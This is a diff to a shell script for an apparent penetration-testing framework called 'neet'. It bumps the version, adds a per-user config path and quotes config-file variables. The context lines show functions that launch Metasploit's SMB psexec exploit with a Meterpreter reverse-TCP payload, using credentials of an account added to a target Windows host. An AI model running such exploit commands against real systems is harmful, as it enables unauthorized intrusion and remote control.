@@ -31,8 +31,11 @@
 # The other functions are the actual user commands.
 
 # Config File
-VERSION=1.1.6
+VERSION=1.1.7
 CONFIG="/opt/neet/etc/neet.conf"
+if [ -f "${HOME}/.neet/neet.conf" ]; then
+	CONFIG="${HOME}/.neet/neet.conf"
+fi
 
 # Check we're in a valid directory
 if [ ! -d .neet ] || [ -f .neet/wd ]; then
@@ -54,10 +57,10 @@ export NeetCTL="${PWD}/.neet"
 export INTERACT="${NeetCTL}/interaction"
 
 # Resource Directory
-RD=`grep "^ResourceDirectory=" ${CONFIG} | awk -F= {print'$2'}`
+RD=`grep "^ResourceDirectory=" "${CONFIG}" | awk -F= {print'$2'}`
 
 # Neet Log file
-NeetLOG=`grep "^LogFile=" ${CONFIG} | awk -F= {print'$2'}`
+NeetLOG=`grep "^LogFile=" "${CONFIG}" | awk -F= {print'$2'}`
 NeetLOG="logs/$NeetLOG"
 
 # Bin Directory
@@ -69,7 +72,7 @@ NEETSH="${BaseD}/neetsh"
 HTDD="${BaseD}/doc"
 
 # HTML Viewer
-BROWSER=`grep "^Viewer.HTML=" ${CONFIG} | awk -F= {print'$2'}`
+BROWSER=`grep "^Viewer.HTML=" "${CONFIG}" | awk -F= {print'$2'}`
 
 # Metasploit
 MSF2="${BaseD}/pkg/framework2"
@@ -1053,8 +1056,8 @@ function psexec {
 	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
 		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
 			if [ -z $2 ]; then
-				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
-				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				local user=`grep "^NewUser=" "$CONFIG" | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" "$CONFIG" | awk -F= {print'$2'}`
 				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
 				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$user" SMBPass="$pass" E
 				cd $od
@@ -1107,8 +1110,8 @@ function ___shell {
 	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
 		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
 			if [ -z $2 ]; then
-				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
-				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				local user=`grep "^NewUser=" "$CONFIG" | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" "$CONFIG" | awk -F= {print'$2'}`
 				winshell $IP "$user" "$pass"
 			else
 				winshell $IP "$1" "$2"
